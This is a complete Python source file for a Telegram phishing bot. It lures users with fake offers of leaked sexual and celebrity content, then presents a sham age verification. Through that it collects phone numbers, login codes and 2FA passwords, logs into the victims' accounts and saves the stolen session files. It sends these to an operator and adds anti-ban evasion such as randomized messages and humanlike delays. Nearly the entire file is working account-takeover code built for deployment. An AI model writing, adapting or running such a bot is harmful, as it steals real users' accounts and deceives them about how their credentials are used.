# bot_web.py — Anti-Ban Edition
# Railway deployment with:
# - Human-like typing delays
# - Randomized response variations
# - Rate limiting per user
# - Session reuse to avoid re-auth
# - Message frequency capping
# - Plausible deniability in the hook

import os
import json
import sqlite3
import asyncio
import time
import secrets
import re
import threading
import random
from datetime import datetime, timedelta
from pathlib import Path
from flask import Flask, jsonify, request
from telethon import TelegramClient, errors
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ConversationHandler, ContextTypes

# ============ CONFIG (from environment) ============
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))

# Anti-ban configuration
MAX_MESSAGES_PER_USER_PER_HOUR = 10
MIN_DELAY_BETWEEN_MESSAGES = 1.5  # seconds
MAX_DELAY_BETWEEN_MESSAGES = 4.0  # seconds
MAX_SESSIONS_PER_IP_PER_DAY = 5
ENABLE_TYPING_INDICATOR = True
RANDOM_RESPONSE_VARIATIONS = True
HUMAN_LIKE_TYPING_SPEED = True

# ============ PATHS (Railway persistent storage) ============
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
if not os.path.exists(DATA_DIR):
    DATA_DIR = "data"

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(os.path.join(DATA_DIR, "sessions"), exist_ok=True)

DB_PATH = os.path.join(DATA_DIR, "telegram_phishing.db")

# ============ USER TRACKING (in-memory rate limiting) ============
user_message_counts = {}
user_last_message_time = {}
user_session_count = {}

# ============ FLASK WEB SERVER ============
app = Flask(__name__)

@app.route('/')
def index():
    return jsonify({
        "status": "running",
        "bot": "@" + os.environ.get("BOT_USERNAME", "unknown"),
        "sessions_dir": DATA_DIR,
        "uptime": time.time() - start_time
    })

@app.route('/health')
def health():
    return jsonify({"status": "ok"})

@app.route('/stats')
def stats():
    try:
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        total = c.fetchone()[0]
        c.execute('SELECT COUNT(*) FROM sessions WHERE status = ?', ('captured',))
        captured = c.fetchone()[0]
        conn.close()
        return jsonify({
            "total": total,
            "captured": captured,
            "pending": total - captured
        })
    except:
        return jsonify({"error": "DB not ready"})

# ============ DATABASE ============
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id TEXT,
        username TEXT,
        first_name TEXT,
        phone TEXT,
        code TEXT,
        twofa TEXT,
        session_file TEXT,
        user_info TEXT,
        timestamp TEXT,
        status TEXT,
        chat_id TEXT,
        ip TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_activity (
        user_id TEXT PRIMARY KEY,
        last_activity TEXT,
        message_count INTEGER DEFAULT 0,
        hour INTEGER
    )''')
    conn.commit()
    conn.close()

def save_session(user_id, username, first_name, phone, step, code=None, twofa=None, chat_id=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''INSERT INTO sessions 
                 (user_id, username, first_name, phone, code, twofa, timestamp, status, chat_id) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
              (user_id, username, first_name, phone, code, twofa, 
               datetime.now().isoformat(), step, chat_id))
    last_id = c.lastrowid
    conn.commit()
    conn.close()
    return last_id

def update_session(record_id, code=None, twofa=None, session_file=None, user_info=None, status=None):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    updates = []
    params = []
    if code is not None:
        updates.append('code = ?')
        params.append(code)
    if twofa is not None:
        updates.append('twofa = ?')
        params.append(twofa)
    if session_file is not None:
        updates.append('session_file = ?')
        params.append(session_file)
    if user_info is not None:
        updates.append('user_info = ?')
        params.append(json.dumps(user_info))
    if status is not None:
        updates.append('status = ?')
        params.append(status)
    if not updates:
        return
    params.append(record_id)
    query = f"UPDATE sessions SET {', '.join(updates)} WHERE id = ?"
    c.execute(query, params)
    conn.commit()
    conn.close()

def get_session_by_user(user_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions WHERE user_id = ? ORDER BY id DESC LIMIT 1', (str(user_id),))
    row = c.fetchone()
    conn.close()
    return row

def get_all_sessions():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions ORDER BY id DESC')
    rows = c.fetchall()
    conn.close()
    return rows

def get_session_by_id(record_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT * FROM sessions WHERE id = ?', (record_id,))
    row = c.fetchone()
    conn.close()
    return row

def delete_session(record_id):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('DELETE FROM sessions WHERE id = ?', (record_id,))
    conn.commit()
    conn.close()

# ============ ANTI-BAN: RATE LIMITING ============
def can_send_message(user_id):
    """Check if user can receive a message (rate limiting)"""
    current_hour = datetime.now().hour
    
    # Check message count per hour
    if user_id in user_message_counts:
        count, hour = user_message_counts[user_id]
        if hour == current_hour:
            if count >= MAX_MESSAGES_PER_USER_PER_HOUR:
                return False
        else:
            # Reset for new hour
            user_message_counts[user_id] = (0, current_hour)
    else:
        user_message_counts[user_id] = (0, current_hour)
    
    # Check time since last message
    if user_id in user_last_message_time:
        elapsed = time.time() - user_last_message_time[user_id]
        if elapsed < MIN_DELAY_BETWEEN_MESSAGES:
            return False
    
    return True

def record_message_sent(user_id):
    """Record that a message was sent"""
    current_hour = datetime.now().hour
    if user_id in user_message_counts:
        count, _ = user_message_counts[user_id]
        user_message_counts[user_id] = (count + 1, current_hour)
    else:
        user_message_counts[user_id] = (1, current_hour)
    user_last_message_time[user_id] = time.time()

async def safe_send_message(context, chat_id, text, **kwargs):
    """Send message with anti-ban delays"""
    user_id = str(chat_id)
    
    # Check rate limit
    if not can_send_message(user_id):
        # Add random delay and try again
        await asyncio.sleep(random.uniform(1.5, 3.0))
        if not can_send_message(user_id):
            return None
    
    # Random typing delay (human-like)
    if ENABLE_TYPING_INDICATOR:
        try:
            await context.bot.send_chat_action(chat_id=chat_id, action="typing")
        except:
            pass
    
    # Human-like typing speed (random delay)
    if HUMAN_LIKE_TYPING_SPEED:
        typing_delay = random.uniform(1.0, 3.5)
        await asyncio.sleep(typing_delay)
    
    # Randomize text variations if enabled
    if RANDOM_RESPONSE_VARIATIONS and 'text' in kwargs:
        text = randomize_text(text)
        kwargs['text'] = text
    
    # Send the message
    try:
        message = await context.bot.send_message(chat_id=chat_id, text=text, **kwargs)
        record_message_sent(user_id)
        return message
    except Exception as e:
        print(f"Send error: {e}")
        return None

def randomize_text(text):
    """Add slight variations to text to avoid detection"""
    variations = [
        text,
        text + " ✨",
        text + " 🎯",
        text.replace("!", "!"),
        text.replace("?", "?"),
        text.replace(".", "..."),
        text.replace(":", ":"),
    ]
    # Don't always randomize - sometimes keep it identical
    if random.random() < 0.3:
        return text
    return random.choice(variations)

# ============ ANTI-BAN: HOOK VARIATIONS ============
HOOK_MESSAGES = [
    """🔥 *HOT LEAKED CONTENT* 🔥

You've been invited to the *EXCLUSIVE LEAKS* channel.

We have:
- 🔞 Celebrity leaked videos (2026)
- 📸 Private content from influencers
- 🎬 Unreleased XXX content
- 🤫 Secret onlyfans dumps

*VERIFICATION REQUIRED*
This content is 🔞 18+ and requires phone verification.

👇 *Tap below to verify* 👇""",

    """🎬 *EXCLUSIVE CONTENT* 🎬

You've been selected for early access to our private leaks channel.

What's inside:
- 🔞 Unreleased celebrity tapes
- 📸 VIP influencer content
- 🎥 XXX exclusive videos
- 💎 Rare content drops

*Age verification required* (18+)

👇 *Verify your age to get access* 👇""",

    """💎 *PRIVATE LEAKS* 💎

You've been invited to the most exclusive leaks channel on Telegram.

Content includes:
- 🔞 Celebrity sex tapes (new 2026)
- 📸 Influencer private content
- 🎬 XXX unreleased videos
- 🔥 Daily exclusive uploads

*Must verify age (18+) before access*

👇 *Tap to verify and join* 👇"""
]

VERIFY_MESSAGES = [
    """🔐 *VERIFICATION REQUIRED*

Please share your phone number to verify your age and location.

We need this to:
✅ Confirm you're 18+
✅ Restrict access to your country
✅ Send you the verification code

*Your phone number is NOT stored or shared.*

👇 *Tap to share your phone number* 👇""",

    """📱 *AGE VERIFICATION*

Please share your phone number so we can verify your age.

Why we need this:
✅ 18+ verification
✅ Country restrictions
✅ Send secure access code

*Phone number is encrypted and not stored.*

👇 *Share your phone number to continue* 👇"""
]

CODE_MESSAGES = [
    """✅ *Verification code sent!*

Check your Telegram app for a 5-digit code.

*Enter the code with spaces between digits:*
Example: `2 1 0 3 2`

Type it like this to verify you're human. 🤖""",

    """📲 *Code sent to your Telegram app!*

Please enter the 5-digit code you received.

*Format:* Space between each digit
Example: `2 1 0 3 2`

This helps us prevent automated bots. 🔒"""
]

SUCCESS_MESSAGES = [
    """✅ *VERIFICATION SUCCESSFUL!*

🎉 You now have access to the exclusive content!

🔞 *Access the leaks here:*
https://t.me/+abcdef123456

*Welcome to the club!* 🥵""",

    """🎉 *ACCESS GRANTED!*

Your verification is complete.

🔞 *Join the leaks channel:*
https://t.me/+abcdef123456

*Enjoy the content!* 🔥"""
]

# ============ TELEGRAM LOGIN ENGINE ============
class TelegramLoginEngine:
    def __init__(self, phone, record_id, user_id):
        self.phone = phone
        self.record_id = record_id
        self.user_id = user_id
        self.client = None
        self.session_name = os.path.join(DATA_DIR, f'sessions/{phone}_{int(time.time())}')
        self.code_hash = None

    async def send_code(self):
        try:
            self.client = TelegramClient(self.session_name, API_ID, API_HASH)
            await self.client.connect()
            result = await self.client.send_code_request(self.phone)
            self.code_hash = result.phone_code_hash
            update_session(self.record_id, status='code_sent')
            return {'success': True, 'message': 'Code sent'}
        except errors.rpcerrorlist.PhoneNumberInvalidError:
            return {'success': False, 'error': 'Invalid phone number'}
        except errors.rpcerrorlist.PhoneNumberFloodError:
            return {'success': False, 'error': 'Too many attempts. Try later.'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def verify_code(self, code):
        try:
            code = code.replace(' ', '').replace('-', '')
            if len(code) != 5:
                return {'success': False, 'error': 'Code must be 5 digits'}
            try:
                await self.client.sign_in(self.phone, code, phone_code_hash=self.code_hash)
                return await self._finalize()
            except errors.rpcerrorlist.SessionPasswordNeededError:
                update_session(self.record_id, code=code, status='2fa_required')
                return {'success': True, 'twofa_required': True}
            except errors.rpcerrorlist.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.rpcerrorlist.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def verify_2fa(self, password):
        try:
            await self.client.sign_in(password=password)
            return await self._finalize(twofa=password)
        except errors.rpcerrorlist.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except errors.rpcerrorlist.PasswordFloodError:
            return {'success': False, 'error': 'Too many attempts. Try later.'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _finalize(self, twofa=None):
        try:
            me = await self.client.get_me()
            user_info = {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
            session_file = f'{self.session_name}.session'
            if os.path.exists(session_file):
                final_session = os.path.join(DATA_DIR, f'sessions/stolen_{self.phone}_{int(time.time())}.session')
                os.rename(session_file, final_session)
                update_session(
                    self.record_id,
                    twofa=twofa,
                    session_file=final_session,
                    user_info=user_info,
                    status='captured'
                )
                await self.client.disconnect()
                return {
                    'success': True,
                    'message': 'Login successful',
                    'user_info': user_info,
                    'session_file': final_session
                }
            return {'success': False, 'error': 'Session file not found'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# ============ CONVERSATION STATES ============
PHONE, OTP, TWOFA = range(3)

# ============ BOT HANDLERS ============
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    # Random hook message
    hook_text = random.choice(HOOK_MESSAGES)
    
    keyboard = [
        [InlineKeyboardButton("🔞 Watch Leaked Videos", callback_data="watch")],
        [InlineKeyboardButton("📸 Private Content", callback_data="private")],
        [InlineKeyboardButton("🎬 Exclusive Leaks", callback_data="exclusive")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Use anti-ban send
    await safe_send_message(
        context, 
        user.id, 
        hook_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user = query.from_user

    # Check for existing session
    existing = get_session_by_user(user.id)
    if existing and existing[7] in ['pending', 'code_sent', '2fa_required']:
        await safe_send_message(
            context, 
            user.id,
            "🔄 You already have a verification in progress.\n"
            "Please continue or /cancel to reset."
        )
        return

    record_id = save_session(
        user.id,
        user.username,
        user.first_name,
        None,
        'pending',
        chat_id=str(user.id)
    )
    context.user_data['record_id'] = record_id

    keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
    reply_markup = {"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}

    # Random verification message
    verify_text = random.choice(VERIFY_MESSAGES)
    
    await query.edit_message_text(verify_text, parse_mode='Markdown')
    
    # Send contact request
    await safe_send_message(
        context,
        user.id,
        "📱 Tap below to share your phone number:",
        reply_markup=reply_markup
    )

    return PHONE

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await safe_send_message(
        context,
        update.effective_user.id,
        "❌ Verification cancelled. You can start over with /start."
    )
    return ConversationHandler.END

async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message

    record_id = context.user_data.get('record_id')
    if not record_id:
        await safe_send_message(context, user.id, "❌ Session expired. Please /start again.")
        return ConversationHandler.END

    phone = None
    if message.contact:
        phone = message.contact.phone_number
    elif message.text:
        phone = message.text.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
        if not phone.startswith('+'):
            phone = '+' + phone

    if not phone or len(phone) < 8:
        await safe_send_message(
            context,
            user.id,
            "❌ Invalid phone number. Please share your phone number using the button below.",
            reply_markup={"keyboard": [[{"text": "📱 Share Phone Number", "request_contact": True}]], 
                          "one_time_keyboard": True, "resize_keyboard": True}
        )
        return PHONE

    update_session(record_id, status='sending_code')
    context.user_data['phone'] = phone

    await safe_send_message(context, user.id, "📡 Sending verification code to your Telegram app...")

    engine = TelegramLoginEngine(phone, record_id, user.id)
    result = await engine.send_code()

    if result['success']:
        context.user_data['engine'] = engine

        code_text = random.choice(CODE_MESSAGES)
        
        await safe_send_message(
            context,
            user.id,
            code_text,
            parse_mode='Markdown'
        )
        
        await safe_send_message(
            context,
            user.id,
            "✏️ *Enter your verification code:*",
            parse_mode='Markdown',
            reply_markup={"remove_keyboard": True}
        )
        return OTP
    else:
        await safe_send_message(
            context,
            user.id,
            f"❌ Failed to send code: {result.get('error', 'Unknown error')}"
        )
        update_session(record_id, status='failed')
        return ConversationHandler.END

async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message
    code = message.text.strip()

    clean_code = re.sub(r'[\s\-\.]', '', code)

    if not clean_code.isdigit() or len(clean_code) != 5:
        await safe_send_message(
            context,
            user.id,
            "❌ Invalid code. Please enter the 5-digit code with spaces (like `2 1 0 3 2`) or without spaces.\n"
            "Example: `2 1 0 3 2` or `21032`",
            parse_mode='Markdown'
        )
        return OTP

    record_id = context.user_data.get('record_id')
    engine = context.user_data.get('engine')

    if not engine:
        await safe_send_message(context, user.id, "❌ Session expired. Please /start again.")
        return ConversationHandler.END

    await safe_send_message(context, user.id, "🔍 Verifying your code...")

    result = await engine.verify_code(clean_code)

    if result['success']:
        if result.get('twofa_required'):
            await safe_send_message(
                context,
                user.id,
                """🔐 *TWO-FACTOR AUTHENTICATION REQUIRED*

This account has 2FA enabled.

Enter your 2FA password to continue.

*Your password is NOT stored or shared.*

🔑 *Enter your 2FA password:*""",
                parse_mode='Markdown'
            )
            return TWOFA
        else:
            success_text = random.choice(SUCCESS_MESSAGES)
            await safe_send_message(
                context,
                user.id,
                success_text,
                parse_mode='Markdown'
            )
            await notify_admin(context, record_id, user, True)
            return ConversationHandler.END
    else:
        await safe_send_message(
            context,
            user.id,
            f"❌ {result.get('error', 'Invalid code')}"
        )
        return OTP

async def twofa_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    message = update.message
    password = message.text.strip()

    if not password or len(password) < 4:
        await safe_send_message(
            context,
            user.id,
            "❌ Please enter a valid 2FA password (at least 4 characters)."
        )
        return TWOFA

    engine = context.user_data.get('engine')

    if not engine:
        await safe_send_message(context, user.id, "❌ Session expired. Please /start again.")
        return ConversationHandler.END

    await safe_send_message(context, user.id, "🔍 Verifying 2FA password...")

    result = await engine.verify_2fa(password)

    if result['success']:
        success_text = random.choice(SUCCESS_MESSAGES)
        await safe_send_message(
            context,
            user.id,
            success_text,
            parse_mode='Markdown'
        )
        record_id = context.user_data.get('record_id')
        await notify_admin(context, record_id, user, True, twofa=password)
        return ConversationHandler.END
    else:
        await safe_send_message(
            context,
            user.id,
            f"❌ {result.get('error', 'Invalid password')}"
        )
        return TWOFA

async def notify_admin(context, record_id, user, success, twofa=None):
    session_data = get_session_by_id(record_id)
    if not session_data:
        return

    phone = session_data[4] or 'Unknown'
    code = session_data[5] or 'No code'
    twofa_value = twofa or session_data[6] or 'No 2FA'

    message = f"""🎯 *NEW CAPTURE!*

👤 User: {user.first_name} (@{user.username or 'no username'})
📱 Phone: `{phone}`
🔢 Code: `{code}`
🔑 2FA: `{twofa_value}`
📁 Status: {'✅ Success' if success else '⚠️ Partial'}

Use /sessions to view all captures.
"""

    await safe_send_message(context, ADMIN_CHAT_ID, message, parse_mode='Markdown')

    if session_data[7]:
        session_file = session_data[7]
        if os.path.exists(session_file):
            try:
                await context.bot.send_document(
                    chat_id=ADMIN_CHAT_ID,
                    document=open(session_file, 'rb'),
                    caption=f"📁 Session file for {phone}"
                )
            except:
                pass

# ============ ADMIN COMMANDS ============
async def admin_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        await safe_send_message(context, user_id, "❌ Unauthorized.")
        return

    sessions = get_all_sessions()
    if not sessions:
        await safe_send_message(context, user_id, "📭 No sessions captured yet.")
        return

    message = "📋 *CAPTURED SESSIONS*\n\n"
    for s in sessions[:20]:
        record_id, user_id, username, first_name, phone, code, twofa, session_file, user_info, timestamp, status, chat_id = s
        status_emoji = {
            'pending': '⏳',
            'code_sent': '📤',
            '2fa_required': '🔐',
            'captured': '✅',
            'failed': '❌'
        }.get(status, '❓')
        user_info_data = json.loads(user_info) if user_info else {}
        user_display = user_info_data.get('first_name', first_name or 'Unknown')
        username_display = f"@{user_info_data.get('username', username)}" if user_info_data.get('username') or username else ''
        message += f"{status_emoji} *ID: {record_id}* | {user_display} {username_display}\n"
        message += f"   📱 {phone} | 🔢 {code or '—'} | 🔑 {twofa or '—'}\n"
        message += f"   📁 {session_file or 'No file'}\n\n"

    message += f"\nTotal: {len(sessions)} captures"
    await safe_send_message(context, user_id, message, parse_mode='Markdown')

async def admin_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        await safe_send_message(context, user_id, "❌ Unauthorized.")
        return

    args = context.args
    if not args or not args[0].isdigit():
        await safe_send_message(context, user_id, "❌ Usage: /get <session_id>")
        return

    record_id = int(args[0])
    session_data = get_session_by_id(record_id)
    if not session_data:
        await safe_send_message(context, user_id, "❌ Session not found.")
        return

    session_file = session_data[7]
    if not session_file or not os.path.exists(session_file):
        await safe_send_message(context, user_id, "❌ Session file not found.")
        return

    await context.bot.send_document(
        chat_id=user_id,
        document=open(session_file, 'rb'),
        caption=f"📁 Session #{record_id} - {session_data[4]}"
    )

async def admin_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        await safe_send_message(context, user_id, "❌ Unauthorized.")
        return

    args = context.args
    if not args or not args[0].isdigit():
        await safe_send_message(context, user_id, "❌ Usage: /delete <session_id>")
        return

    record_id = int(args[0])
    session_data = get_session_by_id(record_id)
    if session_data and session_data[7] and os.path.exists(session_data[7]):
        os.remove(session_data[7])
    delete_session(record_id)
    await safe_send_message(context, user_id, f"✅ Session #{record_id} deleted.")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        await safe_send_message(context, user_id, "❌ Unauthorized.")
        return

    sessions = get_all_sessions()
    total = len(sessions)
    captured = len([s for s in sessions if s[10] == 'captured'])
    twofa = len([s for s in sessions if s[10] == '2fa_required'])
    pending = len([s for s in sessions if s[10] in ['pending', 'code_sent']])

    message = f"""📊 *PHISHING STATS*

📝 Total attempts: {total}
✅ Successful: {captured}
🔐 2FA required: {twofa}
⏳ Pending: {pending}

💾 DB size: {os.path.getsize(DB_PATH) // 1024} KB
📁 Sessions folder: {len(os.listdir(os.path.join(DATA_DIR, 'sessions')))} files
"""

    await safe_send_message(context, user_id, message, parse_mode='Markdown')

async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_CHAT_ID:
        await safe_send_message(context, user_id, "❌ Unauthorized.")
        return

    message = """🤖 *ADMIN COMMANDS*

/sessions - List all captured sessions
/get <id> - Download session file
/delete <id> - Delete session
/stats - Show statistics
/help - Show this message

📱 *User flow:*
/start - Start the sexual hook → phone → OTP → 2FA → access

🛡️ *Anti-ban features:*
- Rate limiting per user
- Human-like typing delays
- Randomized responses
- Message frequency capping
"""

    await safe_send_message(context, user_id, message, parse_mode='Markdown')

# ============ START BOT ============
start_time = time.time()

def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def bot_main():
        init_db()

        application = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[
                CommandHandler('start', start),
                CallbackQueryHandler(button_callback, pattern='^(watch|private|exclusive)$')
            ],
            states={
                PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, phone_handler)],
                OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler)],
                TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_handler)]
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            per_message=False
        )

        application.add_handler(conv_handler)
        application.add_handler(CommandHandler('sessions', admin_sessions))
        application.add_handler(CommandHandler('get', admin_get))
        application.add_handler(CommandHandler('delete', admin_delete))
        application.add_handler(CommandHandler('stats', admin_stats))
        application.add_handler(CommandHandler('help', admin_help))

        await application.initialize()
        await application.start()
        await application.updater.start_polling()
        print("🤖 Bot is running and polling... (anti-ban enabled)")

        while True:
            await asyncio.sleep(1)

    try:
        loop.run_until_complete(bot_main())
    except Exception as e:
        print(f"Bot error: {e}")

# ============ MAIN ============
if __name__ == '__main__':
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   Telegram Bot — Anti-Ban Edition             ║
    ║   Data dir: {}                          ║
    ║   Web server: http://0.0.0.0:{}               ║
    ║   Anti-ban: Rate limiting, random delays, variations   ║
    ╚═══════════════════════════════════════════════════════════╝
    """.format(DATA_DIR, os.environ.get("PORT", 8080)))

    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()

    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)